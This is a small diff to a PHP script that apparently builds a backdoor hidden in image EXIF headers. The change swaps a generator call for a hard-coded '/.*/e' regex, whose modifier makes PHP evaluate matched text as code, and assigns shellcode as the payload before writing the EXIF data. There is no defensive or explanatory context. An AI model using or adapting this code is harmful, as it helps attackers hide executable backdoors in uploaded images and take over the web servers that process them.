@@ -66,7 +66,9 @@ $used    =  array();
 $regex   = $payload = '';
 $headers = explode(",", $headers);
 
-generate();
+$regex = '/.*/e';
+$payload = $shellcode;
+#generate();
 write_exif();
 
 function write_exif() {
